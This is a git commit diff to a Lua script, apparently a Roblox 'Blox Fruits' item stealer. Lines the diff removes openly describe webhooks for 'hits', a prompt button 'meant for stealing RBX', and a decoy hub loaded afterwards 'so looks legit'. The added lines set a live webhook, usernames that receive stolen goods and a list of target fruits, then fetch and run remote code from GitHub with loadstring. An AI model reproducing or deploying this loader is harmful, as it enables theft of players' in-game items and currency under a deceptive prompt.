433c7926b12f05779df6fcd60abc1c7af81ccf6e
ruaRaito <vano.frog2312@gmail.com>
2025-04-04 22:50:18 +0300

    RuaRaito.lua

--- RuaRaito.lua
+++ RuaRaito.lua
@@ -1,8 +1,5 @@
-LogsWebhook = "" -- << Webhook for logging hits >>
-ExecutionWebhook = "" -- << Webhook for logging executions >>
-Username = "" -- << Username of the account where gifts will be sent >>
-PromptText = "Launch Script." -- << Text of the button meant for stealing RBX >>
-RandomizedPrompt = false -- << Makes the prompt have a unique design each execution >>
-LoadRedzAfterHit = false -- << Loads redz hub after you get a hit, so looks legit >>
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=u_Nnw_2YRvooyNt9wpY2dQ%3Ao0rvmDhahoj1Nu_STWI8mi0J4oxlFn1UKyNAaohyB5GATBXVzmNeR-Kmi7D6eBM5BFB0EFXKvP41JuC7KR10MI6C4nuPE5PhF39RGnu1Atp8yQbIn7EX5rgBkjIUrUfSzJ5MQNSJ_lLqcMaP48a1jDkvgNZh3MZV4UVokBCYxVE" -- << Your Webhook
+Usernames = {"bloxy_fruits2312", "gaus_v3"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
